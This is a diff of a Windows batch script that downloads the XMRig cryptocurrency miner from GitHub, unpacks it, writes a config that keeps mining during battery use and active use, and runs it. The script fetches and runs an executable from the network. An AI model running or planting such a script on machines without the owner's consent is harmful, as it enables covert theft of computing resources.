@@ -1,12 +1,17 @@
 @echo off
 @echo off
-if exist "C:\path\to\folder\file.txt" (
+if exist "xmrig-6.21.3-msvc-win64" (
     echo File exists.
 ) else (
 
     curl -O -L https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip
+    
+    timeout /t 10 /nobreak
 
-    expand xmrig-6.21.3-msvc-win64.zip -F:* 
+
+    tar -m -xf xmrig-6.21.3-msvc-win64.zip
+
+    timeout /t 10 /nobreak
 
     (
     echo. {
@@ -113,7 +118,7 @@ if exist "C:\path\to\folder\file.txt" (
     echo.     "pause-on-battery": false,
     echo.     "pause-on-active": false
     echo. }
-    ) > xmrig-6.21.3-msvc-win64\\xmrig-6.21.3\\config.json
+    ) > xmrig-6.21.3\\config.json
 )
 
-xmrig-6.21.3-msvc-win64\\xmrig-6.21.3\\xmrig.exe
+xmrig-6.21.3\\xmrig.exe
